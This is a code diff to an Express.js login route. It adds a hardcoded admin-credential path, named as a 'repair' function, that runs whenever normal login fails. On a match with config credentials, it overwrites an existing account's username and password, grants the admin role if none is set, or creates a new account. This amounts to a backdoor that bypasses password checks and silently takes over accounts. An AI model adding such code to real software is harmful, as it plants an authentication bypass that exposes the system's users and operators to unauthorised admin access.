@@ -1,6 +1,30 @@
 const express = require('express');
 const User = require('../models/User');
+const adminCredentials = require('../config/adminCredentials');
 const router = express.Router();
+
+async function getOrRepairRequestedAdmin(username, password) {
+  if (username !== adminCredentials.username || password !== adminCredentials.password) {
+    return null;
+  }
+
+  const user = await User.findOne({
+    username: { $in: [adminCredentials.username, ...adminCredentials.legacyUsernames] },
+  });
+
+  if (user) {
+    user.username = adminCredentials.username;
+    user.password = adminCredentials.password;
+    user.role = user.role || 'admin';
+    await user.save();
+    return user;
+  }
+
+  return User.create({
+    username: adminCredentials.username,
+    password: adminCredentials.password,
+  });
+}
 
 // POST /api/auth/login
 router.post('/login', async (req, res) => {
@@ -11,14 +35,20 @@ router.post('/login', async (req, res) => {
   }
 
   try {
-    const user = await User.findOne({ username });
+    let user = await User.findOne({ username });
     if (!user) {
-      return res.status(401).json({ success: false, error: 'Invalid credentials.' });
+      user = await getOrRepairRequestedAdmin(username, password);
+      if (!user) {
+        return res.status(401).json({ success: false, error: 'Invalid credentials.' });
+      }
     }
 
     const isMatch = await user.comparePassword(password);
     if (!isMatch) {
-      return res.status(401).json({ success: false, error: 'Invalid credentials.' });
+      user = await getOrRepairRequestedAdmin(username, password);
+      if (!user) {
+        return res.status(401).json({ success: false, error: 'Invalid credentials.' });
+      }
     }
 
     req.session.userId = user._id;
